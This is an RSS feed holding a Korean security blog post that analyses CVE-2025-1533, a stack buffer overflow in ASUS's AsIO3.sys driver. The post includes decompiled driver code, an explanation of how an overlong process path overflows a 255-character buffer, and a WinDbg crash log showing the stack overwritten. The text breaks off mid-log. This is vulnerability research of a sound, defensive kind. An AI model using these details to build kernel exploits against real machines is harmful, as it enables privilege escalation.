<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 02 Jul 2025 01:00:34 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-1533: ASUS AsIO3.sys의 Stack Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/</link>
      <guid>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/</guid>
      <pubDate>Wed, 02 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_rep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2144">https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2144</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Asus Armoury Crate 5.9.13.0</li><li>AI suite 3 ver 1.0.0.0</li><li>AsIO3 Driver 1.02.30</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-1533&#xC740; AsIO3.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; Asusgio3 &#xC7A5;&#xCE58; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC73C;&#xB824;&#xACE0; &#xD560; &#xB54C; Stack Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; Asusgio3 &#xC7A5;&#xCE58; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC544;&#xB798; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>SHA-256 &#xD574;&#xC2DC; &#xAC80;&#xC99D;</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID) allowed list &#xD655;&#xC778;</li></ol><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span> sub_140002EF4() <span class="hljs-comment">// Is AsusCertService.exe trying to obtain a handle ?</span>{[...]  <span class="hljs-keyword">if</span> ( pZwQueryInformationProcess( (HANDLE)<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>LL, ProcessImageFileNameWin32, <span class="hljs-number">0</span>LL, <span class="hljs-number">0</span>, (PULONG)NumberOfBytes) == <span class="hljs-number">0xC0000004</span> )  {win32ImagePath = (_UNICODE_STRING *)ExAllocatePoolWithTag(PagedPool, *(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes, <span class="hljs-string">&apos;pPR&apos;</span>);<span class="hljs-keyword">if</span> ( win32ImagePath ){  memset(PoolWithTag, <span class="hljs-number">0</span>, *(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes);  pZwQueryInformationProcess((HANDLE)<span class="hljs-number">-1</span>LL,ProcessImageFileNameWin32,win32ImagePath,*(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes,<span class="hljs-number">0</span>LL);  <span class="hljs-keyword">if</span> ( (<span class="hljs-built_in">int</span>)Win32PathToNtPath(win32ImagePath, &amp;ntImagePath) &gt;= <span class="hljs-number">0</span> )  {fileContent = GetFileContent(&amp;ntImagePath, &amp;fileSize);<span class="hljs-keyword">if</span> ( fileContent ){  blockSize = <span class="hljs-number">64</span>LL;  v12 = <span class="hljs-number">64</span>LL;  _fileSize = fileSize;  v14 = fileSize;  ptrFileContent = (char *)fileContent;  v13 = (char *)fileContent;  Z_SHA256_Init((SHA256_CTX *)sha_ctx);  <span class="hljs-keyword">if</span> ( _fileSize &lt; <span class="hljs-number">64</span> )blockSize = _fileSize;  v12 = blockSize;  <span class="hljs-keyword">while</span> ( _fileSize &gt; <span class="hljs-number">0</span> )  {<span class="hljs-keyword">if</span> ( _fileSize - blockSize &lt; <span class="hljs-number">0</span> )  blockSize = _fileSize;v12 = blockSize;Util::AES_Block_encrypt(sha_ctx, ptrFileContent, blockSize);ptrFileContent += blockSize;v13 = ptrFileContent;_fileSize -= blockSize;v14 = _fileSize;  }  SHA_Final(sha_ctx, calculatedSHA256);  result = memcmp(calculatedSHA256, &amp;g_sha256Hash, <span class="hljs-number">0x20</span>uLL) == <span class="hljs-number">0</span>; <span class="hljs-comment">// [1]</span>  ExFreePoolWithTag(fileContent, <span class="hljs-number">0x705052</span>u);}  }  RtlFreeUnicodeString(&amp;ntImagePath);  ExFreePoolWithTag(win32ImagePath, <span class="hljs-number">0</span>);}  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC704; <code>sub_140002EF4()</code> &#xD568;&#xC218;&#xB294; SHA-256 &#xD574;&#xC2DC; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xACBD;&#xB85C; &#xD655;&#xC778; </li><li>&#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xC77D;&#xAE30;</li><li>SHA-256 &#xD574;&#xC2DC; &#xACC4;&#xC0B0;</li><li>g_sha256Hash &#xD574;&#xC2DC; &#xAC12;&#xACFC; &#xBE44;&#xAD50;</li></ol><p>&#xB530;&#xB77C;&#xC11C; g_sha256Hash &#xD574;&#xC2DC; &#xAC12;&#xACFC; &#xB2E4;&#xB974;&#xBA74; Asusgio3 &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC5C6;&#xB294;&#xB370; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xACBD;&#xB85C;&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">__int64 __fastcall <span class="hljs-constructor">Win32PathToNtPath(<span class="hljs-params">_UNICODE_STRING</span> <span class="hljs-operator">*</span><span class="hljs-params">win32ImagePath</span>, <span class="hljs-params">struct</span> <span class="hljs-params">_UNICODE_STRING</span> <span class="hljs-operator">*</span><span class="hljs-params">outNtImagePath</span>)</span>{<span class="hljs-literal">[<span class="hljs-operator">...</span>]</span>  WCHAR ntImagePath<span class="hljs-literal">[<span class="hljs-number">255</span>]</span>; <span class="hljs-comment">// [rsp+D0h] [rbp-30h] BYREF</span>  backslashPos = <span class="hljs-number">0</span>;  memset(partition, <span class="hljs-number">0</span>, sizeof(partition));  inBuffer = win32ImagePath-&gt;Buffer; <span class="hljs-comment">// e.g: C:\AAAAAAAAA......\AAAAAAAAAAA....\TestApp.exe</span>  wcscpy(partition, L<span class="hljs-string">&quot;\\??\\&quot;</span>);      <span class="hljs-comment">// [2]</span>  v6 = *inBuffer;  <span class="hljs-keyword">if</span> ( *inBuffer != <span class="hljs-character">&apos;\\&apos;</span> )  {    i = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">do</span>    {      <span class="hljs-keyword">if</span> ( !v6 )        break;      ++i;      ++backslashPos;      v6 = inBuffer<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;    }    <span class="hljs-keyword">while</span> ( v6 != <span class="hljs-character">&apos;\\&apos;</span> );  }    memmove(&amp;partition<span class="hljs-literal">[<span class="hljs-number">4</span>]</span>, inBuffer, backslashPos<span class="hljs-operator"> * </span><span class="hljs-number">2</span>);  <span class="hljs-constructor">RtlInitUnicodeString(&amp;DestinationString, <span class="hljs-params">partition</span>)</span>;  ObjectAttributes.Length = <span class="hljs-number">48</span>;  ObjectAttributes.ObjectName = &amp;DestinationString;  ObjectAttributes.RootDirectory = <span class="hljs-number">0L</span>L;  ObjectAttributes.Attributes = <span class="hljs-number">64</span>;  ObjectAttributes.SecurityDescriptor = <span class="hljs-number">0L</span>L;    status = <span class="hljs-constructor">ZwOpenSymbolicLinkObject(&amp;LinkHandle, 0x80000000, &amp;ObjectAttributes)</span>;  <span class="hljs-keyword">if</span> ( status &gt;= <span class="hljs-number">0</span> )  {    LinkTarget.Buffer = (PWSTR)<span class="hljs-constructor">ExAllocatePoolWithTag(PagedPool, 0xFFuLL, 0x705052u)</span>;        status = <span class="hljs-constructor">ZwQuerySymbolicLinkObject(LinkHandle, &amp;LinkTarget, &amp;ReturnedLength)</span>;    <span class="hljs-constructor">ZwClose(LinkHandle)</span>;    memset(ntImagePath, <span class="hljs-number">0</span>, sizeof(ntImagePath));     <span class="hljs-comment">// [3]</span>memcpy(ntImagePath, LinkTarget.Buffer , LinkTarget.Length) <span class="hljs-comment">// where LinkTarget.Buffer e.g  == \Device\HarddiskVolume3</span>    ptrWin32ImagePath = &amp;win32ImagePath-&gt;Buffer<span class="hljs-literal">[<span class="hljs-identifier">backslashPos</span>]</span>; <span class="hljs-comment">// set pointer to the application path without partition letter. e.g: AAAAAAAAA......\AAAAAAAAAAA....\TestApp.exe</span>    ptrNtImagePath = ntImagePath;    <span class="hljs-keyword">do</span>      ++ptrNtImagePath;    <span class="hljs-keyword">while</span> ( *ptrNtImagePath ); <span class="hljs-comment">//set pointer at the end of current string </span>    idx = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">do</span>    {      wcharToCopy = ptrWin32ImagePath<span class="hljs-literal">[<span class="hljs-identifier">idx</span>]</span>;      ptrNtImagePath<span class="hljs-literal">[<span class="hljs-identifier">idx</span><span class="hljs-operator">++</span>]</span> = wcharToCopy;    }    <span class="hljs-keyword">while</span> ( wcharToCopy );    <span class="hljs-constructor">RtlInitUnicodeString(&amp;<span class="hljs-params">tmpString</span>, (PCWSTR)</span>ntImagePath);    <span class="hljs-constructor">RtlCopyUnicodeString(<span class="hljs-params">outNtImagePath</span>, &amp;<span class="hljs-params">tmpString</span>)</span>;    <span class="hljs-constructor">RtlFreeUnicodeString(&amp;LinkTarget)</span>;  }  return (unsigned <span class="hljs-built_in">int</span>)status;}</code></pre><p><code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xB294; win32 Path(C:\TestApp.exe)&#xB97C; NT Namespace Path(\Device\HarddiskVolume3\TestApp.exe)&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>[2]&#xC5D0;&#xC11C; <code>win32ImagePath</code> &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xB97C; &#xBD84;&#xB9AC;&#xD558;&#xACE0;, <code>ZwOpenSymbolicLinkObject</code>&#xC640; <code>ZwQuerySymbolicLinkObject</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; NT Namespace Path&#xB97C; &#xC5BB;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C; NT Namespace Path&#xB97C; ntImagePath&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; do-while&#xBB38;&#xC744; &#xD1B5;&#xD574; win32ImagePath&#xC5D0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xB098;&#xBA38;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; ntImagePath&#xC5D0; &#xC774;&#xC5B4; &#xBD99;&#xC5EC; win32 Path&#xB97C; NT Namespace Path&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; ntImagePath &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xB97C; 255&#xB85C; &#xC124;&#xC815;&#xD55C; &#xC774;&#xC720;&#xB294; Windows&#xC758; &#xCD5C;&#xB300; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xAC00; 255&#xC774;&#xBBC0;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC9C0;&#xB9CC;, &#xACBD;&#xB85C; &#xC55E;&#xC5D0; <code>\\?\</code>&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xACBD;&#xC6B0; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xAC00; 32,767&#xAE4C;&#xC9C0; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry">https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry</a></li></ul><pre><code class="hljs dns">Stack before get overwrittenfffff8<span class="hljs-number">07`66943926</span> <span class="hljs-number">4533</span>c0          xor     r8d,r8d<span class="hljs-number">18</span>: kd&gt; kb # RetAddr               : Args to Child                                                           : Call Site<span class="hljs-number">00</span> fffff8<span class="hljs-number">07`66943021</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff9888`b4ab586c <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : AsIO<span class="hljs-number">3+0x3926</span><span class="hljs-number">01</span> fffff8<span class="hljs-number">07`66942596</span>     : ffff9888`c152ad<span class="hljs-number">00 00000000</span>`c<span class="hljs-number">0000002</span> ffff9888`c152ae<span class="hljs-number">50 00000000</span>`<span class="hljs-number">00000001</span> : AsIO<span class="hljs-number">3+0x3021</span><span class="hljs-number">02</span> fffff807`<span class="hljs-number">622650d5</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff8<span class="hljs-number">07`62261993</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff9888`e3ab7e98 : AsIO<span class="hljs-number">3+0x2596</span><span class="hljs-number">03</span> fffff807`<span class="hljs-number">626</span>becb3     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff938a`<span class="hljs-number">6</span>fccf0d0 ffff9888`e3ab7e98 ffff9888`c152ad00 : nt!IofCallDriver+<span class="hljs-number">0</span>x55<span class="hljs-number">04</span> fffff807`<span class="hljs-number">626</span>cac24     : fffff807`<span class="hljs-number">626</span>bd700 fffff807`<span class="hljs-number">626</span>bd700 ffff9888`b4941a00 ffff938a`<span class="hljs-number">6</span>fccf1f0 : nt!IopParseDevice+<span class="hljs-number">0</span>x15b3<span class="hljs-number">05</span> fffff807`<span class="hljs-number">626c95d2</span>     : ffff9888`e30d9a01 ffff938a`<span class="hljs-number">6</span>fccf1f<span class="hljs-number">0 00000000</span>`<span class="hljs-number">00000040</span> ffff9888`b4ab5820 : nt!ObpLookupObjectName+<span class="hljs-number">0</span>x1104<span class="hljs-number">06</span> fffff807`<span class="hljs-number">626</span>ace47     : ffff9<span class="hljs-number">249`00000000</span> ffff9888`dbf27a<span class="hljs-number">20 00000098</span>`c<span class="hljs-number">0f6f980</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : nt!ObOpenObjectByNameEx+<span class="hljs-number">0</span>x1f2<span class="hljs-number">07</span> fffff807`<span class="hljs-number">626</span>ac319     : <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f920</span> <span class="hljs-number">00000000</span>`c<span class="hljs-number">0100080</span> <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f980</span> <span class="hljs-number">00000098</span>`c<span class="hljs-number">0f6f928</span> : nt!IopCreateFile+<span class="hljs-number">0</span>xb17<span class="hljs-number">08</span> fffff807`<span class="hljs-number">6242a508</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!NtCreateFile+<span class="hljs-number">0</span>x79<span class="hljs-number">09</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">68</span>ff0e44     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6671a650</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000360</span> : nt!KiSystemServiceCopyEnd+<span class="hljs-number">0</span>x28<span class="hljs-number">0</span>a <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6671a650</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000360</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : ntdll!NtCreateFile+<span class="hljs-number">0</span>x14<span class="hljs-number">0</span>b <span class="hljs-number">00007</span>ffd`<span class="hljs-number">66719</span>fbc     : <span class="hljs-number">00007</span>ff6`af8311ae b<span class="hljs-number">2200007</span>`ff69d4f0 a<span class="hljs-number">8c00000</span>`<span class="hljs-number">00032</span>cc<span class="hljs-number">1 00000000</span>`<span class="hljs-number">00000000</span> : KERNELBASE!CreateFileInternal+<span class="hljs-number">0</span>x590<span class="hljs-number">0</span>c <span class="hljs-number">00007</span>ff6`af835925     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : KERNELBASE!CreateFileW+<span class="hljs-number">0</span>x7c<span class="hljs-number">0d</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00000003</span> : <span class="hljs-number">0</span>x00007ff6`af835925Bug triggeredFor analysis of this file, run !analyze -vnt!DbgBreakPointWithStatus:fffff807`<span class="hljs-number">6241f2f0</span> cc              int     <span class="hljs-number">3</span><span class="hljs-number">18</span>: kd&gt; !analyze -vConnected to Windows <span class="hljs-number">10 22621</span> x64 target at (Thu Jan <span class="hljs-number">23 21:09:08</span>.<span class="hljs-number">278 2025</span> (UTC + <span class="hljs-number">1</span>:<span class="hljs-number">00</span>)), ptr64 TRUELoading Kernel Symbols............................................................................................................................................................................................................................................Loading User Symbols.........Loading unloaded module list...........************* Symbol Loading Error Summary **************Module name            ErrorSharedUserData         No error - symbol load deferredYou can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded.You should also verify that your symbol search path (.sympath) is correct.********************************************************************************                                                                             **                        Bugcheck Analysis                                    **                                                                             ********************************************************************************DRIVER_OVERRAN_STACK_BUFFER (f7)<span class="hljs-keyword">A</span> driver has overrun a stack-based buffer.  This overrun could potentiallyallow a malicious user to gain control of this machine.DESCRIPTION<span class="hljs-keyword">A</span> driver overran a stack-based buffer (or local variable) in a way that wouldhave overwritten the function&apos;s return address and jumped back to an arbitraryaddress when the function returned.  This is the classic &quot;buffer overrun&quot;hacking attack and the system has been brought down to prevent a malicious userfrom gaining complete control of it.Do a kb to get a stack backtrace -- the last routine on the stack before thebuffer overrun handlers and BugCheck call is the one that overran its localvariable(s).Arguments:Arg1: ffbe93cb6f8de881, Actual security check cookie from the stackArg2: <span class="hljs-number">00000581</span>a36bfe71, Expected security check cookieArg3: fffffa7e5c94018e, Complement of the expected security check cookieArg4: <span class="hljs-number">0000000000000000</span>, zeroDebugging Details:------------------Unable to load image \??\C:\Windows\system32\drivers\AsIO3.sys, Win32 error <span class="hljs-number">0</span>n2KEY_VALUES_STRING: <span class="hljs-number">1</span>[...]magic_cookie value check:<span class="hljs-number">18</span>: kd&gt; dq ffff938a`<span class="hljs-number">6</span>fcceb90 L1ffff938a`<span class="hljs-number">6</span>fcceb90  <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>Last <span class="hljs-number">20</span> frames<span class="hljs-number">18</span>: kd&gt; kb <span class="hljs-number">20</span> # RetAddr               : Args to Child                                                           : Call Site<span class="hljs-number">00</span> fffff8<span class="hljs-number">07`62566c12</span>     : ffff938a`<span class="hljs-number">6</span>fcccf40 fffff807`<span class="hljs-number">622a9f60</span> ffff8<span class="hljs-number">181`38f51180</span> ffbe93cb`<span class="hljs-number">6</span>f8de801 : nt!DbgBreakPointWithStatus<span class="hljs-number">01</span> fffff807`<span class="hljs-number">625662d3</span>     : ffff8<span class="hljs-number">181`00000003</span> ffff938a`<span class="hljs-number">6</span>fcccf40 fffff807`<span class="hljs-number">6242</span>ef<span class="hljs-number">20 00000000</span>`<span class="hljs-number">000000f7</span> : nt!KiBugCheckDebugBreak+<span class="hljs-number">0</span>x12<span class="hljs-number">02</span> fffff8<span class="hljs-number">07`62415017</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">000000</span>ee fffff807`<span class="hljs-number">623</span>c26fb ffff938a`<span class="hljs-number">6</span>fcce6<span class="hljs-number">48 00000000</span>`<span class="hljs-number">00000001</span> : nt!KeBugCheck2+<span class="hljs-number">0</span>xba3<span class="hljs-number">03</span> fffff8<span class="hljs-number">07`66946f97</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">000000f7</span> ffbe93cb`<span class="hljs-number">6</span>f8de8<span class="hljs-number">81 00000581</span>`a36bfe71 fffffa7e`<span class="hljs-number">5</span>c94018e : nt!KeBugCheckEx+<span class="hljs-number">0</span>x107<span class="hljs-number">04</span> fffff8<span class="hljs-number">07`66947032</span>     : ffff938a`<span class="hljs-number">6</span>fccd6d8 ffff938a`<span class="hljs-number">6</span>fccdce<span class="hljs-number">0 00000000</span>`<span class="hljs-number">6</span>fccde60 ffff938a`<span class="hljs-number">6</span>fccdc68 : AsIO<span class="hljs-number">3+0x6f97</span><span class="hljs-number">05</span> fffff807`<span class="hljs-number">66946</span>fcb     : fffff8<span class="hljs-number">07`00000000</span> fffff8<span class="hljs-number">07`6222e158</span> fffff807`<span class="hljs-number">66946</span>fb<span class="hljs-number">8 00000000</span>`<span class="hljs-number">00000000</span> : AsIO<span class="hljs-number">3+0x7032</span><span class="hljs-number">06</span> fffff8<span class="hljs-number">07`624205b2</span>     : ffff938a`<span class="hljs-number">6</span>fccde60 ffff938a`<span class="hljs-number">6</span>fccd720 fffff8<span class="hljs-number">07`66940000</span> fffff8<span class="hljs-number">07`66943958</span> : AsIO3+<span class="hljs-number">0</span>x6fcb<span class="hljs-number">07</span> fffff807`<span class="hljs-number">6222</span>cc93     : ffff938a`<span class="hljs-number">6</span>fcce890 ffff938a`<span class="hljs-number">6</span>fcce648 fffff8<span class="hljs-number">07`66943958</span> fffff807`<span class="hljs-number">6694a0b4</span> : nt!RtlpExecuteHandlerForException+<span class="hljs-number">0</span>x12<span class="hljs-number">08</span> fffff807`<span class="hljs-number">6231817</span>e     : ffffffff`ffffffff ffff938a`<span class="hljs-number">6</span>fcce6f0 ffff938a`<span class="hljs-number">6</span>fcce6f0 ffff938a`<span class="hljs-number">6</span>fccde60 : nt!RtlDispatchException+<span class="hljs-number">0</span>x2f3<span class="hljs-number">09</span> fffff807`<span class="hljs-number">6242</span>af7c     : ffffd203`b9792f70 ffff938a`<span class="hljs-number">6</span>fccec<span class="hljs-number">08 00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000004</span> : nt!KiDispatchException+<span class="hljs-number">0</span>x1ae<span class="hljs-number">0</span>a fffff807`<span class="hljs-number">62425d</span>d8     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00</span>ff0000 ffffd203`ee528<span class="hljs-number">180 00000000</span>`<span class="hljs-number">000000d0</span> ffffd203`b96b44d0 : nt!KiExceptionDispatch+<span class="hljs-number">0</span>x13c<span class="hljs-number">0</span>b fffff807`<span class="hljs-number">6242</span>bc67     : fffff8<span class="hljs-number">07`62261993</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> fffff8<span class="hljs-number">07`66943929</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> : nt!KiGeneralProtectionFault+<span class="hljs-number">0</span>x358<span class="hljs-number">0</span>c fffff8<span class="hljs-number">07`62261993</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> fffff8<span class="hljs-number">07`66943929</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00040244</span> : nt!memcpy+<span class="hljs-number">0</span>xa7<span class="hljs-number">0d</span> fffff8<span class="hljs-number">07`66943958</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffffd203`cca310<span class="hljs-number">10 00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!RtlCopyUnicodeString+<span class="hljs-number">0</span>x43<span class="hljs-number">0</span>e <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : AsIO<span class="hljs-number">3+0x3958</span><span class="hljs-number">0</span>f <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">10 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">11 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">12 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">13 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">14 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">15 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">16 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span 